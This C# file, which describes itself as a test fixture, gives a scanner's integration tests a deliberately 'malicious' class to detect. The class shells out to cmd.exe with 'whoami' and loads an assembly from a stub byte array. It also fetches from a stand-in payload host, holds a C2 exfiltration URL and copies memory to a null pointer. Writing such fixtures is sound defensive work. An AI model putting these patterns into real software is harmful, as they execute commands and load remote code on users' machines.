using System;
using System.Diagnostics;
using System.Net.Http;
using System.Reflection;
using System.Runtime.InteropServices;

// Fixture: malicious C# script with multiple dangerous APIs.
// This file is used by integration tests to verify detection of dangerous patterns.
public class MaliciousScript {
    [DllImport("evil.dll")]
    private static extern void Execute();

    string c2 = "http://192.168.1.100/exfil";
    string cmd = "cmd.exe";

    void Run() {
        // CRITICAL: process execution
        Process.Start("cmd.exe", "/c whoami");

        // CRITICAL: dynamic assembly loading
        byte[] payload = new byte[] { 0x4D, 0x5A, 0x90, 0x00 };
        Assembly.Load(payload);

        // HIGH: HTTP client + unknown URL
        var client = new HttpClient();
        client.GetAsync("https://malicious-payload.ru/drop");

        // MEDIUM: marshal operations
        System.Runtime.InteropServices.Marshal.Copy(payload, 0, IntPtr.Zero, payload.Length);
    }
}
